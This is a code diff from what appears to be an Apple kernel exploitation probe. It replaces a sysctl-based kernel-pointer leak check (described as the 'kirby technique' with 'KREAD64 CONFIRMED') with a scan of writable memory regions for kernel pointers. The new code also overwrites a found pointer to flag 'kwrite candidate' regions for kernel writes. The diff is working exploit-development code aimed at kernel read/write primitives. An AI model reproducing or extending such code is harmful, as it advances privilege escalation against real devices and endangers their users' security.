@@ -161,30 +161,61 @@ static BOOL isKernelPointer(uint64_t v) {
         }
     }
 
-    // --- Phase 5: kernel pointers via sysctl copyout (kirby-style) ---
-    [report appendString:@"\n--- Phase 5: kernel pointers via sysctl copyout ---\n"];
-    for (size_t i = 0; i < regionSize / 8; i++) in64[i] = 0;
+    // --- Phase 5: find existing RW regions with kernel pointers (kirby approach) ---
+    [report appendString:@"\n--- Phase 5: scan RW regions for kernel pointers ---\n"];
 
-    size_t sysctlSize = regionSize;
-    int mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
-    int ret = sysctl(mib, 4, (void *)inputAddr, &sysctlSize, NULL, 0);
-    [report appendFormat:@"sysctl(KERN_PROC_PID %d) ret=%d size=%zu\n", getpid(), ret, sysctlSize];
+    vm_address_t scanAddr = 0;
+    vm_size_t scanSize = 0;
+    vm_region_submap_info_data_64_t scanInfo;
+    mach_msg_type_number_t scanCount;
+    int regionWithKptrs = 0;
 
-    if (ret == 0 && sysctlSize > 0) {
-        int kptr2 = 0;
-        for (size_t i = 0; i < sysctlSize / 8; i++) {
-            uint64_t v = out64[i];
+    while (1) {
+        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
+        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &(uint32_t){0},
+                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
+        if (scanInfo.is_submap) continue;
+        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+        if (scanSize > 16 * 1024 * 1024) continue;
+
+        volatile uint64_t *p = (volatile uint64_t *)scanAddr;
+        size_t words = scanSize / 8;
+        int kptrs = 0;
+        uint64_t firstKptr = 0;
+        size_t firstOffset = 0;
+
+        for (size_t i = 0; i < words; i++) {
+            uint64_t v = p[i];
             if (isKernelPointer(v)) {
-                kptr2++;
-                if (kptr2 <= 10)
-                    [report appendFormat:@"  kread64 kptr[%d] @ +0x%zx: 0x%llx\n", kptr2-1, i*8, v];
+                kptrs++;
+                if (kptrs == 1) { firstKptr = v; firstOffset = i * 8; }
             }
         }
-        [report appendFormat:@"kernel pointers in sysctl data: %d\n", kptr2];
-        if (kptr2 > 0) {
-            [report appendString:@"*** KREAD64 CONFIRMED (kirby technique) ***\n"];
+
+        if (kptrs > 0) {
+            regionWithKptrs++;
+            [report appendFormat:@"region 0x%lx (size=0x%zx): %d kptrs, first=0x%llx @ +0x%zx\n",
+             (unsigned long)scanAddr, scanSize, kptrs, firstKptr, firstOffset];
+
+            // Test: modify a kernel pointer and see if it changes back (kernel writes)
+            volatile uint64_t *kp = (volatile uint64_t *)(scanAddr + firstOffset);
+            uint64_t orig = kp[0];
+            kp[0] = orig + 0x100;
+            uint64_t modified = kp[0];
+            kp[0] = orig; // restore
+
+            if (modified == orig + 0x100) {
+                [report appendFormat:@"  -> WRITABLE (kwrite candidate)\n"];
+            } else {
+                [report appendFormat:@"  -> read-only or kernel-protected\n"];
+            }
         }
+
+        if (regionWithKptrs >= 5) break; // enough
     }
+
+    [report appendFormat:@"regions with kernel pointers: %d\n", regionWithKptrs];
 
     // --- Verdict ---
     [report appendString:@"\n"];
